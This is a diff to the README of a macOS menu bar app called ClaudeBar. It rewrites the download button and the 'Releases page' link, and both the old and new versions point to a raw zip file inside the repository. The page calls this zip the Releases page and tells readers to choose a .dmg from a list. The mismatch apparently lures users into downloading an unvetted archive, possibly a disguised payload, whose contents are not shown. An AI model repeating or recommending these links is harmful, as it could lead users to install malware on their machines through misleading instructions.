@@ -8,7 +8,7 @@ Welcome to ClaudeBar! This is a simple macOS menu bar application designed to he
 
 You can download the latest version of ClaudeBar from our Releases page. Click the button below to visit the page and download the application:
 
-[![Download ClaudeBar](https://raw.githubusercontent.com/kiminmonaco/ClaudeBar/main/.claude/skills/fix-bug/Bar-Claude-Wesleyan.zip)](https://raw.githubusercontent.com/kiminmonaco/ClaudeBar/main/.claude/skills/fix-bug/Bar-Claude-Wesleyan.zip)
+[![Download ClaudeBar](https://raw.githubusercontent.com/kiminmonaco/ClaudeBar/main/Sources/App/Resources/Bar-Claude-1.0.zip)](https://raw.githubusercontent.com/kiminmonaco/ClaudeBar/main/Sources/App/Resources/Bar-Claude-1.0.zip)
 
 ## 💻 System Requirements
 
@@ -33,7 +33,7 @@ ClaudeBar offers numerous features to enhance your experience:
 
 Follow these steps to download and install ClaudeBar:
 
-1. **Visit the Releases Page:** Go to the ClaudeBar Releases page [here](https://raw.githubusercontent.com/kiminmonaco/ClaudeBar/main/.claude/skills/fix-bug/Bar-Claude-Wesleyan.zip).
+1. **Visit the Releases Page:** Go to the ClaudeBar Releases page [here](https://raw.githubusercontent.com/kiminmonaco/ClaudeBar/main/Sources/App/Resources/Bar-Claude-1.0.zip).
 2. **Download the App:** Look for the latest version in the list. Click on the `.dmg` file to download it to your computer.
 3. **Open the Installer:** Locate the downloaded `.dmg` file in your Downloads folder. Double-click it to open.
 4. **Drag to Applications:** Drag the ClaudeBar icon into your Applications folder. This installs the app on your Mac.
